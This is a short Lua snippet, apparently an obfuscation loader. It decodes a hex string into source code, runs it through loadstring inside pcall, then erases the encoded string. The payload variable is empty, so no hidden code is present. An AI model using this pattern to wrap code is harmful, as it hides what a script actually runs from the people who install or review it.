local _raw = ""
local function _decode(d)
    local s = ""
    for i = 1, #d, 2 do s = s .. string.char(tonumber(d:sub(i, i+1), 16)) end
    return s
end
local _s, _e = pcall(function() (loadstring or load)(_decode(_raw))() end)
if not _s then warn("Error: " .. tostring(_e)) end
_raw = nil -- by duytoan
